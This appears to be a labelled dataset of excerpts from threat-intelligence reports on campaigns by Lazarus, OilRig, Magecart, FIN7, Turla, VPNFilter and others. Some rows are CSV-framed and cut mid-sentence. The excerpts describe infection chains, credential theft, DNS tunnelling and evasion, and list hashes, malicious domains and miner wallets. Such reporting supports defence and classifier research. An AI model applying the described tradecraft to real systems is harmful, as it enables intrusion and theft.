Initiating a new recording or stopping a running one is accomplished by calling Winmm . mciSendString API. That controls the multimedia device. Micropsia operators control the recording duration via Delphi timers that allow it to perform a periodic recording. A new recording is initiated by executing the above API using the following string commands. In the same way, stopping the recording and saving it to a file is achieved by executing the following. USB Flash Drives for Document Stealing Controlled by Micropsia operators, the malware is able to register to an event of USB volume insertion to detect new connected USB flash drives.

It is through these intelligence sources that the Chinese-speaking actor which we refer to as ""Rocke"" came to our attention. Rocke actively engages in distributing and executing cyrptomining malware using a varied toolkit that includes Git repositories, HttpFileServers (HFS), and a myriad of different payloads, including shell scripts, JavaScript backdoors, as well as ELF and PE miners. Early campaigns This threat actor initially came to our attention in April 2018, leveraging both Western and Chinese Git repositories to deliver malware to honeypot systems vulnerable to an Apache Struts vulnerability.

A version for Linux is apparently coming soon, according to the website. It’s probably the first time we see this APT group using malware for macOS. The fact that the Lazarus group has expanded its list of targeted operating systems should be a wake-up call for users of non-Windows platforms. Trojanized cryptocurrency trading application Thanks to Kaspersky Lab’s malicious-behavior detection technology, implemented in its endpoint security software, we were able to reassemble the stages of infection and trace them back to their origin. This helped us understand that one of Lazarus’ victims was infected with malware after installing a cryptocurrency trading program. We also confirmed that the user installed this program via a download link delivered over email. Trojanized trading application for Windows Including malicious code into distributed software and putting that on a website would be too obvious. Instead, the attackers went for a more elaborate scheme: the trojan code was pushed out in the form of an update for a trading application. A legitimate-looking application called Celas Trade Pro from Celas Limited showed no signs of malicious behaviour and looked genuine. This application is an all-in-one style cryptocurrency trading program developed by Celas. Screenshot of Celas Trade Pro When we started this research, any user could download the trading application from the Celas website. Checking the installation package downloaded from the website confirmed the presence of a very suspicious updater. Installation package download page We have analyzed the following Windows version of the installation package: MD5: 9e740241ca2acdc79f30ad2c3f50990a File name: celastradepro_win_installer_1.00.00.msi File type: MSI installer Creation time: 2018-06-29 01:16:00 UTC At the end of the installation process, the installer immediately runs the Updater.exe module with the “CheckUpdate” parameter. This file looks like a regular tool and most likely will not arouse the suspicion of system administrators. After all, it even contains a valid digital signature, which belongs to the same vendor. But the devil is in the detail, as usual. The code writer developed this project under the codename “jeus”, which was discovered in a PDB path included in the updater and used as unique HTTP multipart message data separator string.

However, we discovered that this was not a one-off event as initially reported , but part of a massive digital credit card-skimming campaign by the threat group Magecart affecting over 800 e-commerce sites around the world. The target for Magecart actors was the payment information entered into forms on Ticketmaster’s various websites. The method was hacking third-party components shared by many of the most frequented e-commerce sites in the world.

1122,Long_Train,"42 researchers have found a new malware family that is targeting Linux and Microsoft Windows servers that we have named XBash. We can tie this malware to the Iron Group, a threat actor group known for ransomware attacks in the past. Xbash has ransomware and coinmining capabilities. It also has self-propagating capabilities (meaning it has worm-like characteristics similar to WannaCry or Petya/NotPetya). It also has capabilities not currently implemented that, when implemented, could enable it to spread very quickly within an organizations’ network (again, much like WannaCry or Petya/NotPetya). Xbash spreads by attacking weak passwords and unpatched vulnerabilities. Xbash is data-destructive; destroying Linux-based databases as part of its ransomware capabilities. We can also find NO functionality within Xbash that would enable restoration after the ransom is paid. This means that, like NotPetya, Xbash is data destructive malware posing at ransomware. Organizations can protect themselves against Xbash by: Using strong, non-default passwords Keeping up-to-date on security updates Implementing endpoint security on Microsoft Windows AND Linux systems Preventing access to unknown hosts on the internet (to prevent access to command and control servers) Implementing and maintaining rigorous and effective backup and restoration processes and procedures. Palo Alto Networks customers are protected against this threat as outlined at the end of this blog.

They then used two compromised servers and linked them to a high availability cluster to host an IRC bouncer, which was used to command and control the emerging botnet. Aside from finding several exploit files that allowed us to understand how the initial exploit on the first server worked, we also found configuration files of the hackers’ toolset that allowed them to target organizations through DoS and SSH brute force, using so-called “class files.” Moreover, this suggests that the threat actors were building a botnet that can be used for cybercriminal purposes.

Based on various information witnessed within this dropper, Unit 42 has dubbed this malware family CARROTBAT. CARROTBAT was initially discovered in an attack on December 2017. This attack was made against a British government agency using the SYSCON malware family. SYSCON is a simple remote access Trojan (RAT) that uses the file transfer protocol (FTP) for network communications. While there is no evidence that this attack against a British government agency made use of the CARROTBAT dropper, we found overlaps within this attack’s infrastructure that ultimately lead us to CARROTBAT’s initial discovery, as well as other ties between these two malware families.

Toward the end of 2015, we started seeing a new component being deployed by the group: a downloader for the main Sednit backdoor, Xagent. Kaspersky mentioned this component for the first time in 2017 in their APT trend report and recently wrote an article where they quickly described it under the name Zebrocy. This new component is a family of malware, comprising downloaders and backdoors written in Delphi and AutoIt . These components play the same role in the Sednit ecosystem as Seduploader — that of first-stage malware. Victims we have seen targeted by Zebrocy are located in Azerbaijan, Bosnia and Herzegovina, Egypt, Georgia, Iran, Kazakhstan, Korea, Kyrgyzstan, Russia, Saudi Arabia, Serbia, Switzerland, Tajikistan, Turkey, Turkmenistan, Ukraine, Uruguay and Zimbabwe. These targets include embassies, ministries of foreign affairs, and diplomats. The Zebrocy family consists of three components. In the order of deployment these are a Delphi downloader, an AutoIt downloader and a Delphi backdoor. Figure 1 shows the relationship between these components. In this article we describe this family and how it can coexist with the older Seduploader reconnaissance tools. We will talk about some similarities to and differences from Downdelph at the end.

It has strong behavioral ties to Ke3chang and is being used in an ongoing attack campaign against Indian embassy personnel worldwide. This targeting is also consistent with previous attacker TTPs; Ke3chang historically targeted the Ministry of Affairs, and also conducted several prior campaigns against India.

During our research we also arrived at the conclusion that this Trojan evolved from an SMS spyware Trojan that was first spotted in October 2014.

The modern version of Rotexy combines the functions of a banking Trojan and ransomware. It spreads under the name AvitoPay.apk (or similar) and downloads from websites with names like youla9d6h.tk, prodam8n9.tk, prodamfkz.ml, avitoe0ys.tk, etc. These website names are generated according to a clear algorithm: the first few letters are suggestive of popular classified ad services, followed by a random string of characters, followed by a two-letter top-level domain.

Clearly, OilRig incorporates a testing component within their development process, as we have previously observed OilRig performing testing activities on their delivery documents and their TwoFace webshells . This testing component often involves making small modifications to their delivery documents and submitting these files to online public anti-virus scanning tools to determine the maliciousness of a submitted file and to figure out how to evade these detections. Providing a free and quick anti-virus testing service, using these online scanners aids an attacker in understanding which anti-virus engine detects their malware, thus giving the attacker a metaphorical “quality assurance service.” To determine OilRig’s operational tempo, we compared the creation times of the files created during testing, the creation time of the delivery document and the time in which the spear-phishing email was sent in the attack. We found that OilRig began its testing activities just under 6 days prior to the targeted attack and performed three waves of testing attempts on August 20th, 21 st , and 26th. The tester created the final test file less than 8 hours before the creation time of a delivery document, which was then delivered via a spear-phishing email 20 minutes later. OilRig’s Testing Activities While investigating recent attacks performed by the threat actor group OilRig using their new Bondupdater version , Unit 42 researchers searched for additional Microsoft Office documents used by OilRig hoping to locate additional malware being used in other attacks during the same time period. We focused on the functionality and pivoting off the original OilRig Microsoft documents found during our recent investigation. Unit 42 researchers found 11 additional samples that were submitted across several public anti-virus testing sites, as seen in Table 1. These samples appeared to have been created by OilRig during their development and testing activities, all of which share many similarities with the delivery document used in the recent OilRig attack against a Middle Eastern government, N56.15.doc (7cbad6b3f505a199d6766a86b41ed23786bbb99dab9cae6c18936afdc2512f00) that we have also",1

BONDUPDATER is a PowerShell-based Trojan first discovered by FireEye in mid-November 2017 , when OilRig targeted a different Middle Eastern governmental organization. The BONDUPDATER Trojan contains basic backdoor functionality, allowing threat actors to upload and download files, as well as the ability to execute commands. BONDUPDATER, like other OilRig tools, uses DNS tunneling to communicate with its C2 server. During the past month, Unit 42 observed several attacks against a Middle Eastern government leveraging an updated version of the BONDUPDATER malware, which now includes the ability to use TXT records within its DNS tunneling protocol for its C2 communications. A New Series of Attacks In mid-August, the Oilrig threat group sent what appeared to be a highly targeted phishing email to a high-ranking office in a Middle Eastern nation.

While one of the variants was involved in the DNSChanger system of a recent GhostDNS campaign , we believe that Novidade is not limited to a single campaign, as the exploit kit was also concurrently being used in different campaigns.

It is important to emphasize that the campaign focuses on Chrome browsers and Radware believes that users that do not use Chrome are not at risk. [You might also like: Stresspaint Malware Campaign Targeting Facebook Credentials] Botnet Statistics Radware gathered the statistics from various sources, including the malicious extension statistics on the Chrome web store and the Bitly URL shortening service. A victim that clicks on “Add Extension” is redirected to a Bitly URL from which they will be redirected to Facebook. This is done to trick users and retrieve access to their Facebook account. Over 75% of the infections cover the Philippines, Venezuela and Ecuador. The remaining 25% are distributed over 97 other countries. Figure 3: Bitly registration links with over 100,000 victims Bypassing Google Application Validation Tools The campaign operators created copies of legitimate extensions and inject a short, obfuscated malicious script to start the malware operation. Figure 4: Legitimate version on the left, malicious version on the right Radware believes that this is done to bypass Google’s extension validation checks. To date, Radware’s research group has observed seven of these malicious extensions, of which it appears four have been identified and blocked by Google’s security algorithms. Nigelify and PwnerLike remain active. Known Extensions The Malware Once the extension is installed on the Chrome browser, a malicious JavaScript (see below) is executed that downloads the initial configuration from the C2. Figure 5: Configuration file obtained from the C2 Afterwards a set of requests is deployed, each with its own purpose and triggers. Here is the communication protocol. Malware Capabilities Data theft The malware is focused on stealing Facebook login credentials and Instagram cookies. If login occurs on the machine (or an Instagram cookie is found), it will be sent to the C2. The user is then redirected to a Facebook API to generate an access token that will also be sent to the C2 if successful. Facebook Propagation Authenticated users’ Facebook access tokens are generated and the propagation phase begins. The malware collects relevant account information for the purpose of spreading the malicious link to the user’s network. The C2 path “/php3/doms.php” is accessed and returns a random URI. For example: This link is distributed one of two ways: as a message via Facebook Messenger or as a new post that includes tags for up to 50 contacts. Once the victim clicks on the link, the infection process starts over again and redirects them to a YouTube-like webpage that requires a “plugin installation” to view the video. [You might also like: Why Cyber-Security Is Critical to The Loyalty of Your Most Valued Customers] Cryptomining Another plugin that is downloaded by the malware is a cryptomining tool. The attackers are using a publicly available browser-mining tool to get the infected machines to start mining cryptocurrencies. The JavaScript code is downloaded from external sites that the group controls and contains the mining pool. Radware observed that in the last several days the group was trying to mine three different coins (Monero, Bytecoin and Electroneum) that are all based on the “CryptoNight” algorithm that allows mining via any CPU. The pools Radware has witnessed are: • supportxmr.com – 46uYXvbapq6USyzybSCQTHKqWrhjEk5XyLaA4RKhcgd3WNpHVXNxFFbXQYETJox6C5Qzu8yiaxeXkAaQVZEX2BdCKxThKWA • eu.bytecoin-pool.org – 241yb51LFEuR4LVWXvLdFs4hGEuFXZEAY56RB11aS6LXXG1MEKAiW13J6xZd4NfiSyUg9rbERYpZ7NCk5rptBMFE5uZEinQ • etn.nanopool.org – etnk7ivXzujEHf1qXYfNZiczo4ohA4Rz8Fv4Yfc8c5cU1SRYWHVry7Jfq6XnqP5EcL1LiehpE3UzD3MBfAxnJfvh3gksNp3suN At the time of writing, approximately $1,000 was mined over six days, mostly from the Monero pool.

1169,Long_Train,"we will update our findings as we continue our investigation. Both the scale and the capability of this operation are concerning. Working with our partners, we estimate the number of infected devices to be at least 500,000 in at least 54 countries. The known devices affected by VPNFilter are Linksys, MikroTik, NETGEAR and TP-Link networking equipment in the small and home office (SOHO) space, as well at QNAP network-attached storage (NAS) devices. No other vendors, including Cisco, have been observed as infected by VPNFilter, but our research continues. The behavior of this malware on networking equipment is particularly concerning, as components of the VPNFilter malware allows for theft of website credentials and monitoring of Modbus SCADA protocols. Lastly, the malware has a destructive capability that can render an infected device unusable, which can be triggered on individual victim machines or en masse, and has the potential of cutting off internet access for hundreds of thousands of victims worldwide. The type of devices targeted by this actor are difficult to defend. They are frequently on the perimeter of the network, with no intrusion protection system (IPS) in place, and typically do not have an available host-based protection system such as an anti-virus (AV) package. We are unsure of the particular exploit used in any given case, but most devices targeted, particularly in older versions, have known public exploits or default credentials that make compromise relatively straightforward. All of this has contributed to the quiet growth of this threat since at least 2016. This post provides the technical findings you would normally see in a Talos blog. In addition, we will detail some thoughts on the tradecraft behind this threat, using our findings and the background of our analysts, to discuss the possible thought process and decisions made by the actor. We will also discuss how to defend against this threat and how to handle a device that may be infected. Finally, we will share the IOCs that we have observed to this point, although we are confident there are more that we have not seen. Brief technical breakdown The VPNFilter malware is a multi-stage, modular platform with versatile capabilities to support both intelligence-collection and destructive cyber attack operations. The stage 1 malware persists through a reboot, which sets it apart from most other malware that targets internet-of-things devices because malware normally does not survive a reboot of the device.",1
1170,Long_Train,"a new campaign that uses a lesser known tool widely attributed to the Sofacy group called Zebrocy. Zebrocy is delivered primarily via phishing attacks that contain malicious Microsoft Office documents with macros as well as simple executable file attachments. This third campaign is consistent with two previously reported attack campaigns in terms of targeting: the targets were government organizations dealing with foreign affairs. In this case however the targets were in different geopolitical regions. An interesting difference we found in this newest campaign was that the attacks using Zebrocy cast a far wider net within the target organization: the attackers sent phishing emails to a an exponentially larger number of individuals. The targeted individuals did not follow any significant pattern, and the email addresses were found easily using web search engines. This is a stark contrast with other attacks commonly associated with the Sofacy group where generally no more than a handful of victims are targeted within a single organization in a focus-fire style of attack. In addition to the large number of Zebrocy attacks we discovered, we also observed instances of the Sofacy group leveraging the Dynamic Data Exchange (DDE) exploit technique previously documented by McAfee. The instances we observed, however, used the DDE exploit to deliver different payloads than what was observed previously. In one instance the DDE attack was used to deliver and install Zebrocy.

Furthermore, the malicious apps register their intent to process certain events broadcast on compromised devices in order to execute malicious code. This is common practice for many Android apps, however, HenBox sets itself up to trigger based on alerts from Xiaomi smart-home IoT devices, and once activated, proceeds in stealing information from a myriad of sources, including many mainstream chat, communication and social media apps. The stolen information includes personal and device information. The main purpose of this follow-up blog is to provide additional information, and detailed analysis, about HenBox apps. Delivery and Installation During our investigation, we discovered one HenBox app previously hosted on the third-party Android app store, “uyghurapps[.]net”. This HenBox variant masqueraded as the legitimate VPN application, “DroidVPN”, and carried the app as an asset, embedded within itself. Once HenBox installs on a compromised device, it begins the installation process for the legitimate DroidVPN. At the time of writing, we are unaware of any HenBox apps hosted on other third-party app stores; given the high volume of HenBox apps analyzed in our Wildfire sandbox, we can only speculate as to how other apps are delivered to victims; much of the Android malware seen in the wild tends to be delivered via third-party app stores, forums and file-sharing platforms, and of course by via ubiquitous phishing emails. HenBox Decoys Further analysis of the HenBox malware family is below, however, on the subject of masquerading apps, and installing embedded apps, it’s worth explaining how this decoy technique works.

In late February and throughout March 2018, we noticed an increase in infections from IcedID being detected throughout the AMP ecosystem. Like in November 2017, some of the infections could be traced to Emotet, but this time, many detections could instead be traced to emails with attached malicious Microsoft Word documents containing macros. When the malicious documents are opened and the macros are enabled, Ursnif/Dreambot, another trojan, would be downloaded and executed, which subsequently downloads IcedID. In addition to Ursnif/Dreambot, many of the samples downloaded a second payload, a Bytecoin miner (Bytecoin is a crypto currency similar to bitcoin). Ursnif/Dreambot is financially motivated malware that is known to download and install additional modules, or other malware families. This Ursnif/Dreambot/IcedID attack was interesting for two reasons: The targeted nature of the emails that use spear-phishing techniques to entice victims into opening the malicious Microsoft Word documents.

From our tests and the feedback from several researchers, this monitoring is not supported on Hyper-V, VMWare Fusion, VirtualBox, KVM and XEN. It's important to notice that several recent physical systems do not support it (a researcher reported some Lenovo and Dell hosts did not support this). It means that GravityRAT will consider this physical machine as VMs. Importantly to note this check is not foolproof as we have identified physical hosts which do not report back the temperature, however, it should also be considered a check that is identifying a lot of virtual environments. This is particularly important due to the amount of sandboxing & malware detonation being carried out within virtual environments by researchers. Summary Today, Cisco Talos is uncovering a new piece of malware, which has remained under the radar for the past two years while it continues to be developed. Several weeks ago, we identified the use of the latest version of this RAT (Remote Access Tool). In this article, we will discuss the technical capabilities, the evolution, development and potential attribution of what we are calling GravityRAT. GravityRAT has been under ongoing development for at least 18 months, during which the developer has implemented new features. We've seen file exfiltration, remote command execution capability and anti-vm techniques added throughout the life of GravityRAT. This consistent evolution beyond standard remote code execution is concerning because it shows determination and innovation by the actor.

These advanced mechanisms and the information stealing malware will be discussed in detail. We will also review a number of static and dynamic detection mechanisms used in the AMP for Endpoints and Threat Grid product lines to detect these document families. Introduction On June 9th, 2017 Morphisec Lab published a blog post detailing a new infection vector technique using an RTF document containing an embedded JavaScript OLE object. When clicked it launches an infection chain made up of JavaScript, and a final shellcode payload that makes use of DNS to load additional shellcode from a remote command and control server. In this collaboration post with Morphisec Lab and Cisco's Research and Efficacy Team, we are now publishing details of this new document variant that makes use of an LNK embedded OLE object, which extracts a JavaScript bot from a document object, and injects a stealer DLL in memory using PowerShell. The details we are releasing are to provide insight into attack methodologies being employed by sophisticated groups such as FIN7 who are consistently changing techniques between attacks to avoid detection, and to demonstrate the detection capabilities of the AMP for Endpoints and Threat Grid product lines. This is relevant to the constantly changing threats that are affecting multiple types of industries on a daily basis. Infection",1

Companies attacked by Energetic Bear/Crouching Yeti are geographically distributed worldwide with a more obvious concentration in Europe and the US. In 2016-2017, the number of attacks on companies in Turkey increased significantly. The main tactics of the group include sending phishing emails with malicious documents and infecting various servers. The group uses some of the infected servers for auxiliary purposes – to host tools and logs. Others are deliberately infected to use them in waterhole attacks in order to reach the group’s main targets. Recent activity of the group against US organizations was discussed in a US-CERT advisory, which linked the actor to the Russian government, as well as an advisory by the UK National Cyber Security Centre .

This threat group has conducted broad targeting across a variety of industries, including financial, government, energy, chemical, and telecommunications, and has largely focused its operations within the Middle East. We assess that APT34 works on behalf of the Iranian government based on infrastructure details that contain references to Iran, use of Iranian infrastructure, and targeting that aligns with nation-state interests. APT34 uses a mix of public and non-public tools, often conducting spear phishing operations using compromised accounts, sometimes coupled with social engineering tactics.

Based on these factors, Unit 42 believes the attackers behind these attacks are conducting their campaigns for espionage purposes. We believe this group is previously unidentified and therefore have we have dubbed it “RANCOR”. The Rancor group’s attacks use two primary malware families which we describe in depth later in this blog and are naming DDKONG and PLAINTEE. DDKONG is used throughout the campaign and PLAINTEE appears to be new addition to these attackers’ toolkit. Countries Unit 42 has identified as targeted by Rancor with these malware families include, but are not limited to: Singapore Cambodia We identified decoy files which indicate these attacks began with spear phishing messages but have not observed the actual messages. These decoys contain details from public news articles focused primarily on political news and events. Based on this, we believe the Rancor attackers were targeting political entities. Additionally, these decoy documents are hosted on legitimate websites including a government website belonging to the Cambodia Government and in at least once case, Facebook. The malware and infrastructure used in these attacks falls into two distinct clusters, which we are labeling A and B, that are linked through their use of the PLAINTEE malware and several “softer” linkages.

Curiously, our research lead us to connect the nature of Ryuk’s campaign and some of its inner-workings to the HERMES ransomware, a malware commonly attributed to the notorious North Korean APT Lazarus Group, which was also used in massive targeted attacks. This leads us to believe that the current wave of targeted attacks using Ryuk may either be the work of the HERMES operators, the allegedly North Korean group, or the work of an actor who has obtained the HERMES source code. In the below analysis we review the highly targeted attacks that Ryuk has been involved in and make a detailed comparison between it and the notorious HERMES ransomware used in other operations. We also address the financial aspects of the campaign and illustrate how, through tracking the money trail, Ryuk’s authors seem to want to disguise their received payments by dividing and transferring them among multiple wallets. An Overview of Ryuk Unlike the common ransomware, systematically distributed via massive spam campaigns and exploit kits, Ryuk is used exclusively for tailored attacks. In fact, its encryption scheme is intentionally built for small-scale operations, such that only crucial assets and resources are infected in each targeted network with its infection and distribution carried out manually by the attackers.

RedAlpha: New Campaigns Discovered Targeting the Tibetan Community June 26, 2018 • Insikt Group® Click here to download the complete analysis as a PDF. Scope Note : Recorded Future analyzed new malware targeting the Tibetan community. This report includes a detailed analysis of the malware itself and associated infrastructure. Sources include Recorded Future’s platform, VirusTotal, ReversingLabs, and third-party metadata, as well as common OSINT and network metadata enrichments, such as DomainTools Iris and PassiveTotal, and researcher collaboration. 1 The impetus of this research is twofold: to provide indicators to leverage for protection for likely victims and to raise awareness of a possible shift in adversary TTPs. Executive Summary Recorded Future’s Insikt Group has identified two new cyberespionage campaigns targeting the Tibetan community over the past two years. The campaigns, which we are collectively naming RedAlpha, combine light reconnaissance, selective targeting, and diverse malicious tooling. We discovered this activity as the result of pivoting off of a new malware sample observed targeting the Tibetan community based in India. Insikt Group’s analysis of infrastructure overlap among the new campaigns reveals wider targeting of the Chinese “Five Poisons, 2 ” in addition to South and Southeast Asian governments. Based on the campaign’s targeting of “Five Poisons”-related organizations, overlapping infrastructure, and links to malware used by other Chinese APTs uncovered during our research, we assess with medium confidence that the RedAlpha campaigns were conducted by a Chinese APT. Key Judgements The two newly discovered RedAlpha campaigns targeting the Tibetan community took place in 2017 and 2018. For ease of reference, we’ll call them the “2017 hktechy” and “2018 internetdocss” campaigns, after their command-and-control (C2) servers. Attacker tradecraft evolved from bespoke malware consisting of a custom dropper and the NetHelp infostealer implant in 2017 to a custom validator and njRAT commodity malware in 2018. The 2018 internetdocss campaign also leveraged scaled-down infrastructure to possibly reduce the impact of discovery and avoid the loss of proprietary tools and costly to maintain infrastructure. Both campaigns involved the use of payloads configured with several C2 servers; however, malware from both campaigns made use of the doc.internetdocss[.]com C2 domain, thus tying",1

The purpose is to download and execute an additional payload hosted on a compromised website: NavRAT. This is a classic RAT that can download, upload, execute commands on the victim host and, finally, perform keylogging. However, the command and control (C2) infrastructure is very specific. It uses the legitimate Naver email platform in order to communicate with the attackers via email. The uploaded file(s) are sent by email, and the downloaded files are retrieved from an email attachment. We have already observed malware using free email platforms for abuse, but this is the first time we have identified a malware that uses Naver — which is known for its popularity in South Korea. One of the most interesting questions we still have is regarding attribution — and who is behind this malware. Previously, we published several articles concerning Group123 ( here , here , here, here and here ). We currently assess with medium confidence that this campaign and NavRAT are linked to Group123.

1214,Long_Train,"whom the email is sent. According to the data that we have collected, this series of attacks started in November 2017 and is currently in progress. Notably, the first similar attacks were recorded as far back as 2015 . The malware used in these attacks installs legitimate remote administration software – TeamViewer or Remote Manipulator System/Remote Utilities (RMS). This enables the attackers to gain remote control of infected systems. The threat actor uses various techniques to mask the infection and the activity of malware installed in the system. According to the data available, the attackers’ main goal is to steal money from victim organizations’ accounts. When attackers connect to a victim’s computer, they search for and analyze purchase documents, as well as the financial and accounting software used. After that, the attackers look for various ways in which they can commit financial fraud, such as spoofing the bank details used to make payments. In cases where the cybercriminals need additional data or capabilities after infecting a system, such as privilege escalation and obtaining local administrator privileges, the theft of user authentication data for financial software and services, or Windows accounts for lateral movement, the attackers download an additional pack of malware to the system, which is specifically tailored to the attack on each individual victim.

For example, it was used as a downloader for a cyberattack that was launched using the official website of Ukraine-based accounting software developer Crystal Finance Millennium (CFM) in January. Similar to many other campaigns, the initial infection vector was an email with a malicious Microsoft Word document attached. The victims were tricked into opening the attachment and enabling the embedded macros. This started the malware-downloading chain, down to the final Smoke Loader infection and its plugins.

An MDM is designed to deploy applications on enrolled devices. In this campaign we identified five applications that have been distributed by this system to the 13 targeted devices in India. Two of them appear to test the functionality of the device, one steals SMS message contents, and the remaining two report the location of the device and can exfiltrate various data. The attacker used the BOptions sideloading technique to add features to legitimate apps, including the messaging apps WhatsApp and Telegram, that were then deployed by the MDM onto the 13 targeted devices in India. The purpose of the BOptions sideloading technique is to inject a dynamic library in the application. The malicious code inserted into these apps is capable of collecting and exfiltrating information from the device, such as the phone number, serial number, location, contacts, user's photos, SMS and Telegram and WhatsApp chat messages. Such information can be used to manipulate a victim or even use it for blackmail or bribery.

To be infected by this kind of malware, a user needs to enroll their device, which means they should be on the lookout at all times to avoid accidental enrollment. In the new MDM we discovered, the actor changed some of their infrastructure in an attempt to improve the MDM's security posture. We also found additional compromised devices, which were again located in India, with one even using the same phone number linking the MDM platforms, and one located in Qatar. We believe this newer version was used from January to March 2018. Similar to the previous MDM, we were able to identify the IPA files the attacker was using to compromise iOS devices. Additionally, we discovered that malicious apps such as WhatsApp had new malicious methods tacked onto them. During this ongoing analysis, we also looked into other potential indicators that would point us toward the actor. We discovered this Bellingcat article that potentially links this actor to one they dubbed ""Bahamut,"" an advanced actor who was previously targeting Android devices. Bahamut shared a domain name with one of the malicious iOS applications mentioned in our previous post.

However, more complex campaigns require meticulous planning on the part of the attacker and include more sophisticated techniques to hide the presence of the malicious code, evade operating system protection mechanisms and eventually deliver the final payload, likely to be present only in the memory of the infected computer and not as a file on the disk. The attacks we will be highlighting generally start with an email campaign, often targeted toward financial institutions. The malicious emails display a strong command of the English language, and their content may have been taken from legitimate emails relevant to the business of the targeted organization. The emails either contain a URL pointing to one of the three document types or have initial attack stages attached outright. They are using Word OLE compound documents with malicious obfuscated VBA macro code, RTF documents containing Microsoft Office exploits or PDF documents that start the next attack stages to eventually deliver a Cobalt Strike beacon binary or a JScript-based backdoor payload. It is essential to be aware of these attacks as emails look legitimate, but can result in the installation of a payload that can inflict significant financial damage to the targeted organization. Infection vector — Emails All observed attacks start with an email message, containing either a malicious attachment or a URL which leads to the first stage of the attack. The text of the emails is likely taken from legitimate email, such as mailing lists that targeted organisations may be subscribed to.

The message, delivered through the WhatsApp messenger, carried a malicious link which Amnesty International believes belongs to infrastructure connected with NSO Group and previously documented attacks (see below for more information on these connections). This WhatsApp message translates to: ""Can you please cover [the protest] for your brothers detained in Saudi Arabia in front of the Saudi embassy in Washington. My brother is detained in Ramadan and I am on a scholarship here so please do not link me to this [link] Cover the protest now it will start in less than an hour We need your support please"" While we did not include it in this publication, for security reasons, the sender’s number appears to belong to a commercial provider which among other services offers a virtual phone numbers management system, that allows customers to automatically send bulk SMS messages. This type of feature is normally used for promotional campaigns or other forms of automated systems. We believe the attackers might similarly be using this service to automate the process of sending malicious SMS and WhatsApp messages to deliver malware.

Executive Summary Cisco Talos has discovered a new cyber threat campaign that we are calling ""Sea Turtle,"" which is targeting public and private entities, including national security organizations, located primarily in the Middle East and North Africa. The ongoing operation likely began as early as January 2017 and has continued through the first quarter of 2019. Our investigation revealed that at least 40 different organizations across 13 different countries were compromised during this campaign. We assess with high confidence that this activity is being carried out by an advanced, state-sponsored actor that seeks to obtain persistent access to sensitive networks and systems. The actors behind this campaign have focused on using DNS hijacking as a mechanism for achieving their ultimate objectives. DNS hijacking occurs when the actor can illicitly modify DNS name records to point users to actor-controlled servers. The Department of Homeland Security (DHS) issued an alert about this activity on Jan. 24 2019, warning that an attacker could redirect user traffic and obtain valid encryption certificates for an organization's domain names. In the Sea Turtle campaign, Talos was able to identify two distinct groups of victims. The first group, we identify as primary victims, includes national security organizations, ministries of foreign affairs, and prominent energy organizations. The threat actor targeted third-party entities that provide services to these primary entities to obtain access. Targets that fall into the secondary victim category include numerous DNS registrars, telecommunication companies, and internet service providers. One of the most notable aspects of this campaign was how they were able to perform DNS hijacking of their primary victims by first targeting these third-party entities.

Insome instances, when they encountered and could not obtain paymentcard data from point of sale (POS) systems secured with end-to-endencryption (E2EE) or point-to-point encryption (P2PE), FIN7 pivoted totarget finance departments within their victim organizations. Furthermore, in April 2017, FireEye reported that FIN7sent spear phishing emails to personnel involved with United StatesSecurities and Exchange Commission (SEC) filings at multipleorganizations, providing further insight into FIN7’s targeting. Thesetargeted individuals would likely have access to material non-publicinformation that FIN7 actors could use to gain a competitive advantagein stock trading. Diversification of their monetization tactics has allowed the groupto impact a wide range of industries beyond those solely associatedwith payment card industry.

For example, in April 2017, FireEye blogged about FIN7’s spear phishing emails that leveraged hidden shortcut files (LNK files) to initiate the infection and VBScript functionality launched by mshta.exe to infect the victim. This was a direct departure from their established use of weaponized Office macros and highlighted the group’s adaptive nature to evade detection. FireEye also previously reported on FIN7’s use of the CARBANAK backdoor as a post-exploitation tool to cement their foothold in a network and maintain access to victim environments. CARBANAK is well known for its use in highly profitable and sophisticated attacks dating back to 2013, with usage attributable to FIN7 beginning in late 2015, although how interconnected the campaigns employing the malware over this five-year span are is unclear. FIN7’s use of CARBANAK is particularly notable due to their use of creative persistence mechanisms to launch the backdoor. The group leveraged an application shim database that injected a malicious in-memory patch into the Services Control Manager (""services.exe"") process , and then spawned a CARBANAK backdoor process.

More recently, it was involved in major attacks against the German Foreign Office and the French military . This is not the first time Turla has used PowerShell in-memory loaders to increase its chances of bypassing security products. In 2018, Kaspersky Labs published a report that analyzed a Turla PowerShell loader that was based on the open-source project Posh-SecMod . However, it was quite buggy and often led to crashes. After a few months, Turla has improved these scripts and is now using them to load a wide range of custom malware from its traditional arsenal. The victims are quite usual for Turla. We identified several diplomatic entities in Eastern Europe that were compromised using these scripts. However, it is likely the same scripts are used more globally against many traditional Turla targets in Western Europe and the Middle East. Thus, this blogpost aims to help defenders counter these PowerShell scripts. We will also present various payloads, including an RPC-based backdoor and a backdoor leveraging OneDrive as its Command and Control (C&C) server. PowerShell Loader The PowerShell loader has three main steps: persistence, decryption and loading into memory of the embedded executable or library. Persistence The PowerShell scripts are not simple droppers; they persist on the system as they regularly load into memory only the embedded executables.

Antimalware technologies have a poor record of detecting the malware this group has developed. We believe this is likely due to the modular nature of the malware, the malware’s heavy use of batch scripts, and the abuse of legitimate applications and tools (such as wget) for malicious purposes. Previously, LookingGlass reported on a campaign they named “Operation Armageddon,” targeting individuals involved in the Ukrainian military and national security establishment. Because we believe this group is behind that campaign, we’ve named them the Gamaredon Group, an anagram of “Armageddon”. At this time, it is unknown if the new payloads this group is distributing is a continuation of Operation Armageddon or a new campaign. Gamaredon: Historical Tool Analysis The earliest discovered sample (based on compile times and sandbox submission times) distributed by this threat group resembles the descriptions of Gamaredon provided by Symantec and Trend Micro . Unfortunately, this identification is rather tenuous, as it seems to only identify the first variant of payloads used by our threat actors. Some samples of later payload variants also have been given the generic and brittle names of TROJ_RESETTER.BB and TROJ_FRAUDROP.EX . Originally, the payloads delivered to targets by this threat group consisted of a password protected Self-extracting Zip-archive (.SFX) file which, when extracted, wrote a batch script to disk and installed a legitimate remote administration tool called tool Remote Manipulator System (Figure 1) which they would abuse for malicious purposes. Figure 1 Remote Manipulator System Interface One such self-extracting archive (ca87eb1a21c6d4ffd782b225b178ba65463f73de6f4c736eb135be5864f556dc) was first observed around April of 2014. The password (reused by many of the password protected SFX payloads) it used to extract itself is “1234567890__”. The files included in this SFX file we observed include a batch file named “123.cmd” and another SFX named “setting.exe”.

In April, TA505 targeted Latin American countries Chile and Mexico, and even Italy using either FlawedAmmyy RAT or RMS RAT as payload. By the end of April, we learned that the group started to go after targets in East Asian countries such as China, South Korea, and Taiwan using FlawedAmmyy RAT as its payload.

